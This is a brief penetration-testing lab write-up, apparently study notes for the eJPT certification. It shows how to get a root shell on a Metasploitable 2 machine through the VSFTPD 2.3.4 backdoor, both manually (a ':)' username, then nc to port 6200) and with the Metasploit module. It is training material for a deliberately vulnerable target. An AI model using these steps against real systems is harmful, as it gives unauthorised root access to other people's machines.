
Day 07 - VSFTPD v2.3.4 Backdoor RCE | Port 21

Objective
Exploit VSFTPD 2.3.4 backdoor to get root shell on Metasploitable 2.

Discovery
```bash
nmap -sV -p 21 192.168.56.101
21/tcp open  ftp  vsftpd 2.3.4
Vulnerability
CVE-2011-2523 - VSFTPD 2.3.4 contains a backdoor. When username contains `:)`, a shell opens on port 6200.

Exploitation - Manual
ftp 192.168.56.101
User: letmein:)
Pass: anything

nc 192.168.56.101 6200
whoami
root
Exploitation - Metasploit
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
run
Lesson Learned
Never use untrusted binaries. Version 2.3.4 backdoor gives instant root. Always check Exploit-DB.

#eJPT #VSFTPD #RCE